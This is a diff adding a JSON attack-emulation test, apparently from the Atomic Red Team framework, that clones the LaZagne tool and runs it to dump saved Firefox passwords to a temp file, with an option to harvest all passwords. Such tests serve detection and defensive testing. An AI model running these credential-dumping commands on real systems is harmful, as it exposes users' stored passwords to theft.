@@ -1,0 +1,170 @@
+{
+  "id": "87e88698-621b-4c45-8a89-4eaebdeaabb1",
+  "name": "LaZagne.py - Dump Credentials from Firefox Browser",
+  "description": "Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "346085fc-fa8b-414b-9337-701bfa24be30",
+      "type": "execute-command",
+      "data": {
+        "command": "python3 #{lazagne_path}/laZagne.py #{specific_module} \u003e\u003e #{output_file}",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "962e6601-db31-4a96-9b6f-3ffc3aab9d8c",
+      "type": "execute-command",
+      "data": {
+        "command": "rm -R /tmp/LaZagne; rm -f #{output_file}",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "d52974bf-762e-4c67-b434-afdef94d7a97",
+      "name": "Check dependency 1/2",
+      "description": "Get Lazagne from Github and install requirements",
+      "type": "execute-command",
+      "data": {
+        "command": "test -f #{lazagne_path}/laZagne.py",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ba84512e-ad08-4a09-8cda-9e6f59bb000a",
+      "name": "Resolve dependency 1/2",
+      "description": "Get Lazagne from Github and install requirements",
+      "type": "execute-command",
+      "data": {
+        "command": "cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8cd5e46f-2dae-4bb7-8ecb-dad9cbbb0ab9",
+      "name": "Re-check dependency 1/2",
+      "description": "Get Lazagne from Github and install requirements",
+      "type": "execute-command",
+      "data": {
+        "command": "test -f #{lazagne_path}/laZagne.py",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "efe2c0fb-9ba8-4926-8bc7-19ea70b71074",
+      "name": "Check dependency 2/2",
+      "description": "Needs git, python3 and some pip stuff",
+      "type": "execute-command",
+      "data": {
+        "command": "which git \u0026\u0026 which python3 \u0026\u0026 which pip",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e35ad777-648b-4d0f-a345-568dafbcb2ad",
+      "name": "Resolve dependency 2/2",
+      "description": "Needs git, python3 and some pip stuff",
+      "type": "execute-command",
+      "data": {
+        "command": "apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "78fdc6a0-34d4-4e4d-aa13-534d8d04a5ee",
+      "name": "Re-check dependency 2/2",
+      "description": "Needs git, python3 and some pip stuff",
+      "type": "execute-command",
+      "data": {
+        "command": "which git \u0026\u0026 which python3 \u0026\u0026 which pip",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "346085fc-fa8b-414b-9337-701bfa24be30",
+      "p": "on-success",
+      "o": "962e6601-db31-4a96-9b6f-3ffc3aab9d8c"
+    },
+    {
+      "s": "346085fc-fa8b-414b-9337-701bfa24be30",
+      "p": "on-failure",
+      "o": "962e6601-db31-4a96-9b6f-3ffc3aab9d8c"
+    },
+    {
+      "s": "d52974bf-762e-4c67-b434-afdef94d7a97",
+      "p": "on-success",
+      "o": "346085fc-fa8b-414b-9337-701bfa24be30"
+    },
+    {
+      "s": "d52974bf-762e-4c67-b434-afdef94d7a97",
+      "p": "on-failure",
+      "o": "ba84512e-ad08-4a09-8cda-9e6f59bb000a"
+    },
+    {
+      "s": "ba84512e-ad08-4a09-8cda-9e6f59bb000a",
+      "p": "on-success",
+      "o": "8cd5e46f-2dae-4bb7-8ecb-dad9cbbb0ab9"
+    },
+    {
+      "s": "8cd5e46f-2dae-4bb7-8ecb-dad9cbbb0ab9",
+      "p": "on-failure",
+      "o": "346085fc-fa8b-414b-9337-701bfa24be30"
+    },
+    {
+      "s": "efe2c0fb-9ba8-4926-8bc7-19ea70b71074",
+      "p": "on-success",
+      "o": "346085fc-fa8b-414b-9337-701bfa24be30"
+    },
+    {
+      "s": "efe2c0fb-9ba8-4926-8bc7-19ea70b71074",
+      "p": "on-failure",
+      "o": "e35ad777-648b-4d0f-a345-568dafbcb2ad"
+    },
+    {
+      "s": "e35ad777-648b-4d0f-a345-568dafbcb2ad",
+      "p": "on-success",
+      "o": "78fdc6a0-34d4-4e4d-aa13-534d8d04a5ee"
+    },
+    {
+      "s": "78fdc6a0-34d4-4e4d-aa13-534d8d04a5ee",
+      "p": "on-failure",
+      "o": "346085fc-fa8b-414b-9337-701bfa24be30"
+    }
+  ],
+  "tags": [
+    "T1555.003",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "lazagne_path",
+      "type": "string",
+      "description": "Path you put LaZagne Github with LaZagne.py",
+      "value": "/tmp/LaZagne/Linux"
+    },
+    {
+      "name": "specific_module",
+      "type": "string",
+      "description": "You may change the module to \"all\" for all password that can be found by LaZagne.py",
+      "value": "browsers -firefox"
+    },
+    {
+      "name": "output_file",
+      "type": "string",
+      "description": "This is where output for the Firefox passwords goes",
+      "value": "/tmp/firefox_password.txt"
+    }
+  ]
+}
